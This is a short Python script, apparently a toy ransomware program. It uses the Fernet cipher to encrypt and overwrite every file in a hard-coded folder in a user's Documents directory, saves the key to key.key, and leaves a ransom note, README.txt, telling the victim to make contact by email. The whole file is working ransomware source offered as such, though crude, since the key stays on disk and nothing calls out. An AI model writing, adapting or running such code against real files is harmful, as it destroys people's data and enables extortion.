from cryptography.fernet import Fernet
import os

pathFile = 'C:\\Users\\Nelson Sanchez\\Documents\\attact'
    
def generateKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def return_key():
    return open("key.key","rb").read()

def encryp(items,key):
    i = Fernet(key)
    for x in items:
        with open(x,"rb") as file:
            file_data = file.read()
        data = i.encrypt(file_data)
        
        with open(x,"wb") as file:
            file.write(data)

if __name__ == "__main__":
    items = os.listdir(pathFile)
    items2 = [pathFile+"\\"+x for x in items]
    
generateKey()
key = return_key()
encryp(items2,key)
with open(pathFile+"\\"+"README.txt","w") as file:
    file.write("Your files are encryp\nContact to <email>")
